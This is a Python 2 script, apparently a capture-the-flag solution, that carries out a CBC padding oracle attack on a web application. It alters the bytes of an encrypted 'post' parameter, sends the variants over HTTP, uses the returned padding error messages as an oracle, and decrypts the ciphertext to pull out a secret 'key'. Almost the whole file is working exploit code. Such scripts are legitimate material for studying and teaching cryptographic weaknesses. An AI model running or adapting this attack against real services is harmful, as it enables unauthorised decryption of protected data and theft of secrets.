#!/bin/python
import requests
import string
import base64
import binascii
import time
import json
from itertools import izip, cycle


hint = "PaddingException"
hint2 = "IndexError: string index out of range"
hint3 = "ValueError: IV must be 16 bytes long"
hint4 = "ValueError: Input strings must be a multiple of 16 in length"
q_param = 'post={}'

def decode_block(b_1, b_2):
	block_1 = bytearray(b_1)
	block_2 = bytearray(b_2)
	print('decoding block ' + binascii.hexlify(block_2) + ' with block ' + binascii.hexlify(block_1))

	results = bytearray()
	i = 1
	last_ok = 0
	found = False
	while i < 17:
		if not found and i > 1:
			print('found a false positive; going back')
			i -= 1
			j = last_ok + 1
			results.pop(0)
		else:
			j = 0

		found = False
		print('round ' + str(i) + ' with block ' + binascii.hexlify(block_1))
		idx = 16 - i
		b = block_1[idx]
		print('changing byte ' + hex(b))
		test = block_1[:]
		test.extend(block_2[:])

		while j < 256:
			test[idx] = j
			p = base64.b64encode(test).replace('=', '~').replace('/', '!').replace('+', '-')

			query = ''.join([url,'?', q_param.format(p)])
			
			try:
				response = requests.get(query)
			except requests.exceptions.RequestException as e:
				print('Wait a bit and retry.' )
				print(e)
				time.sleep(5)
				response = requests.get(query)

			if not hint in response.text and not hint2 in response.text and not hint3 in response.text and not hint4 in response.text:
				print response.text
				print 'Found valid padding of ' + hex(j)

				results.insert(0, j ^ i)

				for r in range(0,len(results)):
					block_1[idx + r] = (i + 1) ^ results[r]

				print('decoded so far: ' + binascii.hexlify(results))
				found = True
				last_ok = j
				i += 1
				break
			j += 1

	return results

def decode_message(url, blocks):
	print("blocks to decrypt:")
	print blocks 

	decoded_blocks = []

	for x in range(0,len(blocks) - 1):
		decoded = decode_block(blocks[x], blocks[x+1])
		decoded_blocks.append(decoded)
		print('block ' + str(x+1) + ': ' +  binascii.hexlify(decoded))


	print('Decoded cipher text (minus first block)')
	for d in decoded_blocks:
		print binascii.hexlify(d)	

	print('xor-ing blocks with original...')

	decrypted = []	
	end = len(decoded_blocks) - 1
	original = blocks[:-1]
	for i in range(0, len(decoded_blocks)):
		d = bytearray(decoded_blocks[end - i])
		o = bytearray(original[end - i])
		z = bytearray([x^y for x,y in izip(d, cycle(o))])
		decrypted.insert(0,z)

	final = bytearray()
	for d in decrypted:
		final.extend(d)

	return final.decode("utf-8")

def post_id_to_blocks(post):
	post_bytes = bytearray(base64.decodestring(post.replace('~', '=').replace('!', '/').replace('-', '+')))
	if len(post_bytes) != 160:
		raise Exception('Unexpected post id length')

	block_length = 16
	blocks = [post_bytes[i:i + block_length] for i in range(0, len(post_bytes), block_length)]
	return blocks[0], blocks

if __name__ == '__main__':
	url = "" #url here
	post_id = 'zoTtsM0UCAKAxFwkj5WkMU63!uZCxQaA8MkL6N1huwwJQYQGBOdogmfuPlZBUgOSiTLnPhAc8P1q1K9x2mjNciYUBAG8saYZYY85yhWe2FeysLfXUJyA8I2EHShE2QCnQah8sXFKgncG81pNNkb!N5w95D2iV7BYHaXceuYjT1wwDKilH1SUjPZCJ4MAKQfIB2QRWfNj8y5lTlGGZZ5qBA~~'
	iv, blocks = post_id_to_blocks(post_id)

	message = decode_message(url, blocks)
	print("decoded message:")
	print(message)
	found_key = json.loads(message)['key']
	print('Found key: ' + found_key)


